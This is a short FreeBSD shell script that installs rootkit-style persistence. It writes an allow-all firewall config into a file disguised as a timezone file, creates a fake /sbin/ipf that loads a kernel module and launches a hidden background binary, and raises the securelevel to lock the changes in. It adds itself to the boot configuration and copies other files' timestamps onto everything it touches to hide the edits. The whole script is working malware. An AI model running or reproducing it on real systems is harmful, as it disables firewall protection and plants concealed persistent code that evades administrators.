#!/bin/sh

PFCONF=/usr/share/zoneinfo/PST
EVIL_BIN=/sbin/ipf

# Save our default firewall rules
pfctl -sr > $PFCONF
echo pass all >> $PFCONF
touch -r /usr/share/zoneinfo/EST $PFCONF

# Setup our ipf script
cat > $EVIL_BIN << EOF
kldload /boot/kernel/dad.ko
/boot/kernel/son > /dev/null 2> /dev/null &
pfctl -f $PFCONF
sysctl kern.securelevel=3
EOF
chmod 555 $EVIL_BIN
touch -r /sbin/ipfw $EVIL_BIN

# Reload pf config and raise the securelevel
# Try to do this as atomically as possible
$EVIL_BIN

# Setup the startup stuff
ed /etc/defaults/rc.conf << EOF
405i
$EVIL_BIN
.
w
q
EOF
touch -r /etc/rc /etc/defaults/rc.conf

